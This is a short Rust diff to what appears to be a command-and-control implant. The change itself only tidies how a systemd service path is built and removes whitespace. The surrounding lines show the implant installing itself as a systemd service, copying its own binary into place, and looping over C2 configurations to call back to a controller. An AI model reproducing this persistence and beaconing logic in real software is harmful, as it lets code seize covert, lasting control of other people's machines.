@@ -1,4 +1,5 @@
 use std::{fs, thread, time};
+use std::path::PathBuf;
 use rand::Rng;
 use std::process::Command;
 
@@ -40,10 +41,9 @@ WantedBy=multi-user.target
         );
 
         // build the path for the service and write the service file
-        let mut service_file_path = String::new();
-        service_file_path.push_str(SYSTEMD_DIR);
-        service_file_path.push_str(&service_name);
-        service_file_path.push_str(".service");
+        let mut service_file_path = PathBuf::from(SYSTEMD_DIR);
+        service_file_path.push(&service_name);
+        service_file_path.set_extension("service");
         fs::write(service_file_path, service_file_content)?;
 
         // copy the currently running binary to the exec path (yes order is right)
@@ -73,7 +73,7 @@ pub async fn run(config: super::Config) -> Result<(), super::Error> {
     loop {
         loop {
             let c2_config = callback_config.c2_configs[c2_index].clone();
-            
+
             // TODO: do something with c2_config and pass in for graphql
             let resp = match super::graphql::call(
                 String::from("variables"), 
